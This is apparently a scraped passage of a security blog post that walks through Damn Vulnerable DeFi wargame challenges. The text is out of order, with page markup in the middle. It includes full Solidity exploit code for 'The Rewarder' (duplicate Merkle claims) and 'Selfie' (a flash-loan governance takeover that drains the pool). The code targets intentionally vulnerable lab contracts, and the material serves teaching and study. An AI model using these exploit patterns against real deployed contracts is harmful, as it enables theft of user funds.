&lt;p&gt;The problem is that &lt;strong&gt;even if the same reward claim request is submitted multiple times&lt;/strong&gt;, the process of accumulating &lt;code&gt;bitsSet&lt;/code&gt; (&lt;code&gt;bitsSet | 1 &amp;lt;&amp;lt; bitPosition&lt;/code&gt;) does not properly check for duplicates. For example, if the same request is sent five times, the same bit in &lt;code&gt;bitsSet&lt;/code&gt; is simply overwritten five times, and no error occurs.  &lt;/p&gt;
&lt;p&gt;However, since the &lt;code&gt;transfer&lt;/code&gt; operation is executed inside the loop on every iteration, the attacker ends up receiving the reward five times.  &lt;/p&gt;
&lt;p&gt;Because the &lt;code&gt;player&lt;/code&gt; address is already registered in the reward list for each token, this flaw can be exploited by repeatedly claiming the reward assigned to them, thereby solving the challenge.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function test_theRewarder() public checkSolvedByPlayer {

    // Step 1: search player&amp;apos;s index in DVT list
    Reward[] memory dvtRewards = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), &amp;quot;/test/the-rewarder/dvt-distribution.json&amp;quot;))), (Reward[]));
    uint256 dvtIndex;
    uint256 dvtAmount;
    for (uint256 i = 0; i &amp;lt; dvtRewards.length; i++) {
        if (dvtRewards[i].beneficiary == player) {
            dvtIndex = i;
            console.log(&amp;quot;player = &amp;quot;, dvtRewards[i].beneficiary);
            dvtAmount = dvtRewards[i].amount;
            break;
        }
    }
    require(dvtAmount &amp;gt; 0, &amp;quot;Player not in DVT list&amp;quot;);

    // Step 2: search player&amp;apos;s index in WETH list
    Reward[] memory wethRewards = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), &amp;quot;/test/the-rewarder/weth-distribution.json&amp;quot;))), (Reward[]));
    uint256 wethIndex;
    uint256 wethAmount;
    for (uint256 i = 0; i &amp;lt; wethRewards.length; i++) {
        if (wethRewards[i].beneficiary == player) {
            wethIndex = i;
            console.log(&amp;quot;player = &amp;quot;, wethRewards[i].beneficiary);
            wethAmount = wethRewards[i].amount;
            break;
        }
    }
    require(wethAmount &amp;gt; 0, &amp;quot;Player not in WETH list&amp;quot;);

    // Step 3: create proof for each token
    bytes32[] memory dvtLeaves = _loadRewards(&amp;quot;/test/the-rewarder/dvt-distribution.json&amp;quot;);
    bytes32[] memory wethLeaves = _loadRewards(&amp;quot;/test/the-rewarder/weth-distribution.json&amp;quot;);

    bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, dvtIndex);
    bytes32[] memory wethProof = merkle.getProof(wethLeaves, wethIndex);

    // Step 4: create tokensToClaim
    IERC20[] memory tokensToClaim = new IERC20[](2);
    tokensToClaim[0] = IERC20(address(dvt));
    tokensToClaim[1] = IERC20(address(weth));

    // Step 5: calculate how many duplicated claims requires
    uint256 dvtRemaining = distributor.getRemaining(address(dvt));
    uint256 wethRemaining = distributor.getRemaining(address(weth));
    uint256 dvtN = dvtRemaining / dvtAmount; 
    uint256 wethN = wethRemaining / wethAmount;

    // Step 6: create array for duplicated claim
    Claim[] memory claims = new Claim[](dvtN + wethN);
    for (uint256 i = 0; i &amp;lt; dvtN; i++) {
        claims[i] = Claim({
            batchNumber: 0,
            amount: dvtAmount,
            tokenIndex: 0,
            proof: dvtProof
        });
    }
    for (uint256 i = 0; i &amp;lt; wethN; i++) {
        claims[dvtN + i] = Claim({
            batchNumber: 0,
            amount: wethAmount,
            tokenIndex: 1,
            proof: wethProof
        });
    }

    // Step 7: trigger the vulnerability
    distributor.claimRewards(claims, tokensToClaim);

    // Step 8: transfer every tokens to recovery
    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));
}&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;6-Selfie-believe-or-not-I-am-your-governor&#34;&gt;&lt;a href=&#34;#6-Selfie-believe-or-not-I-am-your-governor&#34; class=&#34;headerlink&#34; title=&#34;6. Selfie: believe or not, I am your governor!&#34;&gt;&lt;/a&gt;6. Selfie: believe or not, I am your governor!&lt;/h2&gt;&lt;h3 id=&#34;Challenge-Explanation-5&#34;&gt;&lt;a href=&#34;#Challenge-Explanation-5&#34; class=&#34;headerlink&#34; title=&#34;Challenge Explanation&#34;&gt;&lt;/a&gt;Challenge Explanation&lt;/h3&gt;&lt;p&gt;We&amp;#x2019;re back again with a flash loan challenge!  &lt;/p&gt;
&lt;p&gt;The &lt;code&gt;SelfiePool.flashLoan()&lt;/code&gt; function works as follows:  &lt;/p&gt;
&lt;p&gt;&amp;#x2192; Lends &lt;code&gt;_amount&lt;/code&gt;&lt;br&gt;&amp;#x2192; Calls the &lt;code&gt;onFlashLoan()&lt;/code&gt; function defined in the &lt;code&gt;_receiver&lt;/code&gt; contract&lt;br&gt;&amp;#x2192; Expects the loaned &lt;code&gt;_amount&lt;/code&gt; to be repaid in full  &lt;/p&gt;
&lt;p&gt;At first glance, it looks fairly straightforward. However, what really stands out here is the presence of a contract called &lt;code&gt;SimpleGovernance&lt;/code&gt;.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;contract SelfiePool is IERC3156FlashLender, ReentrancyGuard {
	  // ....
    
    modifier onlyGovernance() {
        if (msg.sender != address(governance)) {
            revert CallerNotGovernance();
        }
        _;
    }

    constructor(IERC20 _token, SimpleGovernance _governance) {
        token = _token;
        governance = _governance;
    }
    
	  // ....
    
    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data)
        external
        nonReentrant
        returns (bool)
    {
        if (_token != address(token)) {
            revert UnsupportedCurrency();
        }

        token.transfer(address(_receiver), _amount);
        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        if (!token.transferFrom(address(_receiver), address(this), _amount)) {
            revert RepayFailed();
        }

        return true;
    }

    function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit EmergencyExit(receiver, amount);
    }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&#34;https://medium.com/@dkopolovets/smart-contract-governance-56852c90d3c2&#34;&gt;Governance&lt;/a&gt; refers to a decision-making body composed of users of a smart contract, typically called a &lt;strong&gt;DAO&lt;/strong&gt; (&lt;strong&gt;D&lt;/strong&gt;ecentralized &lt;strong&gt;A&lt;/strong&gt;utonomous &lt;strong&gt;O&lt;/strong&gt;rganization).  &lt;/p&gt;
&lt;p&gt;DAOs that utilize a given smart contract generally hold voting rights and conduct votes. The DAO members with the majority of voting power gain access to certain administrator-level functions or variables within the smart contract.  &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/09/07/d4tura/smartcontracts/en/image7.png&#34; alt&gt;  &lt;/p&gt;
&lt;p&gt;In most cases, these voting rights are determined by the number of governance tokens issued by the smart contract that a member holds.  &lt;/p&gt;
&lt;p&gt;In the case of this challenge&amp;#x2019;s &lt;code&gt;SimpleGovernance&lt;/code&gt; contract, the function &lt;code&gt;_hasEnoughVotes()&lt;/code&gt; ensures that only those who hold more than half of the total voting tokens (&lt;code&gt;_votingToken&lt;/code&gt;) can call &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/selfie/SimpleGovernance.sol#L23&#34;&gt;SimpleGovernance.queueAction()&lt;/a&gt;.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;contract SimpleGovernance is ISimpleGovernance {
		// ....
		
    constructor(DamnValuableVotes votingToken) {
        _votingToken = votingToken;
        _actionCounter = 1;
    }
    
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        if (!_hasEnoughVotes(msg.sender)) {
            revert NotEnoughVotes(msg.sender);
        }
    
    // ....
   
     function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _votingToken.getVotes(who);
        uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
        return balance &amp;gt; halfTotalSupply;
    }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The important point here is that in the &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/selfie/Selfie.t.sol#L32&#34;&gt;SelfieChallenge.setUp()&lt;/a&gt; function, the token used as the loanable asset for the &lt;code&gt;SelfiePool&lt;/code&gt; is the &lt;strong&gt;same&lt;/strong&gt; token, &lt;code&gt;DamnValuableVotes&lt;/code&gt;, that is also used as the governance voting token.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function setUp() public {
    // ....

    // Deploy token
    token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

    // Deploy governance contract
    governance = new SimpleGovernance(token);

    // Deploy pool
    pool = new SelfiePool(token, governance);

    // ....&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Challenge-Solving-5&#34;&gt;&lt;a href=&#34;#Challenge-Solving-5&#34; class=&#34;headerlink&#34; title=&#34;Challenge Solving&#34;&gt;&lt;/a&gt;Challenge Solving&lt;/h3&gt;&lt;p&gt;Since the token used for loans and the token used for voting are the same, borrowing a large amount of tokens via &lt;code&gt;SelfiePool.flashLoan()&lt;/code&gt; temporarily grants us &lt;strong&gt;the same amount of voting power&lt;/strong&gt;. While holding these borrowed tokens, we gain the ability to call &lt;code&gt;SimpleGovernance.queueAction()&lt;/code&gt;.  &lt;/p&gt;
&lt;p&gt;The &lt;code&gt;queueAction()&lt;/code&gt; function allows us to schedule a specific function call (an Action) into the governance queue. We can leverage this by scheduling a call to the &lt;code&gt;emergencyExit()&lt;/code&gt; function, which withdraws all funds from the &lt;code&gt;SelfiePool&lt;/code&gt;.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;// SimpleGovernance.queueAction
function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
    if (!_hasEnoughVotes(msg.sender)) {
        revert NotEnoughVotes(msg.sender);
    }

    // ....

    actionId = _actionCounter;

    _actions[actionId] = GovernanceAction({
        target: target,
        value: value,
        proposedAt: uint64(block.timestamp),
        executedAt: 0,
        data: data
    });

    unchecked {
        _actionCounter++;
    }

    // ....
}

// SimpleGovernance.executeAction
function executeAction(uint256 actionId) external payable returns (bytes memory) {
	  // _canBeExecuted: requires 2 days delay after queueAction execute
    if (!_canBeExecuted(actionId)) {
        revert CannotExecute(actionId);
    }

    GovernanceAction storage actionToExecute = _actions[actionId];
    actionToExecute.executedAt = uint64(block.timestamp);

    emit ActionExecuted(actionId, msg.sender);

    return actionToExecute.target.functionCallWithValue(actionToExecute.data, actionToExecute.value);
}

// SelfiePool.emergencyExit
function emergencyExit(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);

    emit EmergencyExit(receiver, amount);
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;SimpleGovernance.executeAction()&lt;/code&gt; function is responsible for executing an action that has been queued. For security, it enforces a time delay by checking the &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/selfie/SimpleGovernance.sol#L87&#34;&gt;SimpleGovernance._canBeExecuted()&lt;/a&gt; function. This requires that &lt;strong&gt;at least 2 days&lt;/strong&gt; ( = &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/selfie/SimpleGovernance.sol#L12&#34;&gt;ACTION_DELAY_IN_SECONDS&lt;/a&gt;) have passed since the &lt;code&gt;queueAction()&lt;/code&gt; call before the action can be executed.  &lt;/p&gt;
&lt;p&gt;In the testing environment, of course, we can bypass this by using the &lt;a href=&#34;https://getfoundry.sh/reference/cheatcodes/warp.html&#34;&gt;vm.warp()&lt;/a&gt; function to modify the &lt;code&gt;block.timestamp&lt;/code&gt; value.  &lt;/p&gt;
&lt;p&gt;Based on the analysis so far, the attack flow can be summarized as follows:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Call &lt;code&gt;SelfiePool.flashLoan()&lt;/code&gt; to borrow tokens without collateral and gain massive voting power.  &lt;/li&gt;
&lt;li&gt;From within the &lt;code&gt;onFlashLoan()&lt;/code&gt; callback, call &lt;code&gt;SimpleGovernance.queueAction()&lt;/code&gt; to insert a call to &lt;code&gt;SelfiePool.emergencyExit()&lt;/code&gt; into the &lt;code&gt;_actions&lt;/code&gt; array.  &lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;vm.warp()&lt;/code&gt; to advance the &lt;code&gt;block.timestamp&lt;/code&gt; by at least 2 days.  &lt;/li&gt;
&lt;li&gt;Call &lt;code&gt;SimpleGovernance.executeAction()&lt;/code&gt; to execute the queued action.  &lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;    function test_selfie() public checkSolvedByPlayer {
        SelfieSolver solver = new SelfieSolver(pool, governance, token, recovery);
        solver.solve();
        vm.warp(block.timestamp + 2 days);
        solver.execute();
    }
  
// ....

contract SelfieSolver is IERC3156FlashBorrower {
    SelfiePool public immutable pool;
    SimpleGovernance public immutable governance;
    DamnValuableVotes public immutable token;
    address public immutable recovery;
    uint256 actionId;

    constructor(
        SelfiePool _pool,
        SimpleGovernance _governance,
        DamnValuableVotes _token,
        address _recovery
    ) {
        pool = _pool;
        governance = _governance;
        token = _token;
        recovery = _recovery;
    }

    function solve() external {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(this, address(token), amount, &amp;quot;&amp;quot;);
    }

    function onFlashLoan(
        address initiator,
        address tokenAddr,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        // delegate voting 
        token.delegate(address(this));

        bytes memory callData = abi.encodeCall(pool.emergencyExit, (recovery));
        actionId = governance.queueAction(address(pool), 0, callData);

        token.approve(address(pool), amount);

        return keccak256(&amp;quot;ERC3156FlashBorrower.onFlashLoan&amp;quot;);
    }

    function execute() external {
        governance.executeAction(actionId);
    }
}&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;Next-To-Do&#34;&gt;&lt;a href=&#34;#Next-To-Do&#34; class=&#34;headerlink&#34; title=&#34;Next To Do&#34;&gt;&lt;/a&gt;Next To Do&lt;/h2&gt;&lt;p&gt;That&amp;#x2019;s it for PART 1!&lt;/p&gt;
&lt;p&gt;Challenges 6&amp;#x2013;12 will be covered in PART 2, and Challenges 13&amp;#x2013;18 will be addressed in PART 3. Writing this document wasn&amp;#x2019;t easy, as I&amp;#x2019;m still learning myself and had to rely on my limited knowledge. But in PART 2, I&amp;#x2019;ll do my best to dive deeper into each topic and provide more thorough explanations.  &lt;/p&gt;
&lt;p&gt;Thank you!&lt;/p&gt;
&lt;h2 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.damnvulnerabledefi.xyz/&#34;&gt;https://www.damnvulnerabledefi.xyz/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0&#34;&gt;https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.theredguild.org/releasing-damn-vulnerable-defi-v4/&#34;&gt;https://blog.theredguild.org/releasing-damn-vulnerable-defi-v4/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.openzeppelin.com/&#34;&gt;https://docs.openzeppelin.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://eips.ethereum.org/erc&#34;&gt;https://eips.ethereum.org/erc&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
 - hack &amp; life">
  <meta property="og:image" content="https://hackyboiz.github.io/2025/09/07/d4tura/smartcontracts/en/smartcontracts.jpg">
  <meta property="og:url" content="https://hackyboiz.github.io/">

  <link rel="canonical" href="https://hackyboiz.github.io/2025/09/07/d4tura/smartcontracts/en/">

  <title>[Research] smart contracts auditing 101 for pwners - PART 1 (EN) - hackyboiz</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
  <link rel="stylesheet" href="/lib/hint/hint.min.css">

  
    
    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
<link rel="stylesheet" href="/.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
<link rel="stylesheet" href="/.css">


<link rel="stylesheet" href="/css/main.css">

<!-- 自定义样式保持在最底部 -->


  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>

<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
</head>


<body>
  <header style="height: 40vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-addrcard"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/author/">
                <i class="iconfont icon-user-fill"></i>
                Author
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2025-09-07 17:00" pubdate>
      2025년 9월 7일 오후
    </time>
  </div>


<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      5.3k 자
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      106
       분
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2">
      <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
    </div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">[Research] smart contracts auditing 101 for pwners - PART 1 (EN)</h1>
                       
            <div class="markdown-body" id="post-body">
              <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
              <!-- hackyboiz_horizen_index -->
              <!--
              <ins class="adsbygoogle"
                   style="display:block"
                   data-ad-client="ca-pub-3672652207808168"
                   data-ad-slot="8887862313"
                   data-ad-format="auto"
                   data-full-width-responsive="true"></ins>
              <script>
                   (adsbygoogle = window.adsbygoogle || []).push({});
              </script>
              -->
              <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Hello, I&#x2019;m d4tura, newly joining hackyboiz!</p>
<p>I started writing this research post while solving the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.damnvulnerabledefi.xyz/">Damn Vulnerable DeFi</a> smart contracts wargame, with the goal of breaking down and understanding the concepts required to solve each challenge.  </p>
<p>Originally, I have been doing zero-day research and exploit development for more &#x201C;traditional&#x201D; targets such as kernels, hypervisors, client-server protocols, and mobile platforms&#x2014;both professionally and personally&#x2014;for several years, and that&#x2019;s still my main work today, haha.  </p>
<p>However, I believe that by exploring new fields I haven&#x2019;t touched before and exchanging ideas with others, there is always much to learn from one another. With that mindset, I decided to join the <strong>hackyboiz</strong> team, and chose smart contracts auditing&#x2014;something I had no prior experience with&#x2014;as the subject of my writing.  </p>
<p>This post is written so that people like me, who mainly deal with system hacking, can start smart contracts auditing with just basic blockchain knowledge. Therefore, instead of focusing on the exact solutions for specific challenges, I tried to explain the <strong>core concepts needed to solve them, in the simplest possible way, from a pwner&#x2019;s perspective.</strong>  </p>
<p>Also, while most of the challenges are written in Solidity, I intentionally skipped deep dives into the language itself. The focus here is not on specific bug patterns, but rather on the underlying concepts embedded in each challenge.  </p>
<p>Lastly, for terms that are secondary or might disrupt the flow of the writing, I didn&#x2019;t provide long explanations in the text itself. Instead, I&#x2019;ve added <strong>hyperlinks</strong> to other well-written documents or code references for further reading.  </p>
<p><img src="/2025/09/07/d4tura/smartcontracts/en/image1.png" srcset="/img/loading.gif" alt></p>
<h2 id="Introduction-to-Damn-Vulnerable-DeFi"><a href="#Introduction-to-Damn-Vulnerable-DeFi" class="headerlink" title="Introduction to Damn Vulnerable DeFi"></a>Introduction to Damn Vulnerable DeFi</h2><p>The <strong>Damn Vulnerable DeFi</strong> wargame was originally maintained by the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/OpenZeppelin/damn-vulnerable-defi">OpenZeppelin</a> group and later taken over by The Red Guild, which currently maintains it up to <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0">v4.1.0</a>.  </p>
<p>All challenge environments are defined in the path <code>damn-vulnerable-defi/test/[challenge name]/[challenge name].t.sol</code>. For example, the <code>Unstoppable</code> challenge environment can be found in the file <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/unstoppable/Unstoppable.t.sol">test/unstoppable/Unstoppable.t.sol</a>.  </p>
<p><img src="/2025/09/07/d4tura/smartcontracts/en/image2.png" srcset="/img/loading.gif" alt></p>
<p>Each challenge environment is structured within a single contract and consists of the following functions and parameters:</p>
<ul>
<li><p><code>deployer</code>  </p>
<ul>
<li>The entity responsible for deploying each smart contract, essentially acting as the vendor.  </li>
</ul>
</li>
<li><p><code>player</code>  </p>
<ul>
<li>The participant solving the challenge.  </li>
</ul>
</li>
<li><p><code>setUp()</code>  </p>
<ul>
<li>The function that sets up the challenge environment. Analysis should begin by checking how the environment is initialized here.  </li>
</ul>
</li>
<li><p><code>test_assertInitialState()</code>  </p>
<ul>
<li>A function that verifies whether the initial setup in <code>setUp()</code> was correctly applied.  </li>
</ul>
</li>
<li><p><code>test_challengeName()</code>  </p>
<ul>
<li>The function where the solution must be implemented after analyzing the challenge. The <strong><code>player</code> is only allowed to modify this function.</strong>  </li>
</ul>
</li>
<li><p><code>_isSolved()</code>  </p>
<ul>
<li>A function that determines whether the challenge has been solved. If this function runs and completes without issues, the challenge is considered solved.  </li>
</ul>
</li>
</ul>
<p>Most of the smart contract code targeted by each challenge can be found in the path <code>damn-vulnerable-defi/src/[challenge name]/</code>. In the <code>setUp()</code> function, an instance of the contract is created, and the initial environment is configured. The objective of the wargame is to analyze the vulnerabilities in this contract code and modify the <code>test_challengeName()</code> function so that the <code>_isSolved()</code> function passes.  </p>
<p>Although the concept of a <strong>contract</strong> may feel unfamiliar at first, I personally find it very similar to a <strong>class</strong> in C++ or other object-oriented languages.  </p>
<p><img src="/2025/09/07/d4tura/smartcontracts/en/image3.png" srcset="/img/loading.gif" alt></p>
<p>As an example, let&#x2019;s look at the <code>UnstoppableVault</code> contract from the first challenge we&#x2019;ll cover, <strong>Unstoppable</strong>. Using functionalities from already implemented contracts such as <code>IERC3156FlashLender</code>, <code>ReentrancyGuard</code>, <code>Owned</code>, <code>ERC4626</code>, and <code>Pausable</code> is essentially the same as inheriting from parent classes. In addition, the fact that member variables and functions must be marked with the <code>public</code> keyword to be accessible externally, and that the <code>this</code> keyword is used to reference the current instance, is practically identical to the concept of classes.  </p>
<pre><code class="hljs solidity">/**
 * An ERC4626-compliant tokenized vault offering flashloans for a fee.
 * An owner can pause the contract and execute arbitrary changes.
 */
contract UnstoppableVault is IERC3156FlashLender, ReentrancyGuard, Owned, ERC4626, Pausable {

		// == member variable
    uint256 public constant FEE_FACTOR = 0.05 ether;
    uint64 public constant GRACE_PERIOD = 30 days;

    uint64 public immutable end = uint64(block.timestamp) + GRACE_PERIOD;

    address public feeRecipient;

		// == member function
    constructor(ERC20 _token, address _owner, address _feeRecipient)
        ERC4626(_token, &quot;Too Damn Valuable Token&quot;, &quot;tDVT&quot;)
        Owned(_owner)
    {
        feeRecipient = _feeRecipient;
        emit FeeRecipientUpdated(_feeRecipient);
    }

    /**
     * @inheritdoc IERC3156FlashLender
     */
    function maxFlashLoan(address _token) public view nonReadReentrant returns (uint256) {
        if (address(asset) != _token) {
            return 0;
        }

        return totalAssets();
    }
</code></pre>
<p>Lastly, most challenges involve a token called <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/DamnValuableToken.sol">DamnValuableToken</a>, which is based on <a target="_blank" rel="external nofollow noopener noreferrer" href="https://eips.ethereum.org/EIPS/eip-20">ERC20</a>. It&#x2019;s useful to be familiar with the following commonly used ERC20 functions:</p>
<ul>
<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#ERC20-totalSupply--">totalSupply()</a>  </p>
<ul>
<li>Returns the total amount of assets created in the given token instance.  </li>
</ul>
</li>
<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-balanceOf-address-">balanceOf(address account)</a>  </p>
<ul>
<li>Returns the total amount of tokens held by the given <code>account</code>.  </li>
</ul>
</li>
<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-balanceOf-address-">transfer(address to, address value)</a>  </p>
<ul>
<li>Withdraws <code>value</code> tokens from the caller&#x2019;s account and sends them to <code>to</code>.  </li>
</ul>
</li>
<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-transferFrom-address-address-uint256-">transferFrom(address from, address to, uint256 value)</a>  </p>
<ul>
<li>Withdraws <code>value</code> tokens from the <code>from</code> account and sends them to <code>to</code>.  </li>
</ul>
</li>
<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-approve-address-uint256-">approve(address spender, uint256 value)</a>  </p>
<ul>
<li>Allows <code>spender</code> to withdraw up to <code>value</code> tokens from the caller&#x2019;s account.  </li>
</ul>
</li>
</ul>
<p>(Just FYI, <a target="_blank" rel="external nofollow noopener noreferrer" href="https://eips.ethereum.org/erc">ERC</a> stands for <strong>Ethereum Request for Comment</strong>, essentially the smart contract version of <a target="_blank" rel="external nofollow noopener noreferrer" href="https://en.wikipedia.org/wiki/Request_for_Comments">RFC</a> documents used in traditional programming to define technical specifications.)  </p>
<hr>
<h2 id="1-Unstoppable-total-balance-total-supply"><a href="#1-Unstoppable-total-balance-total-supply" class="headerlink" title="1. Unstoppable: total balance != total supply"></a>1. Unstoppable: total balance != total supply</h2><h3 id="Challenge-Explanation"><a href="#Challenge-Explanation" class="headerlink" title="Challenge Explanation"></a>Challenge Explanation</h3><p>In the case of the <code>Unstoppable</code> challenge, the goal is to trigger a <code>revert</code> statement inside the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/unstoppable/UnstoppableVault.sol#L78">UnstoppableVault.flashLoan()</a> function. There are a total of four <code>revert</code> statements present.  </p>
<pre><code class="hljs solidity">    function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
        external
~~~~        returns (bool)
    {
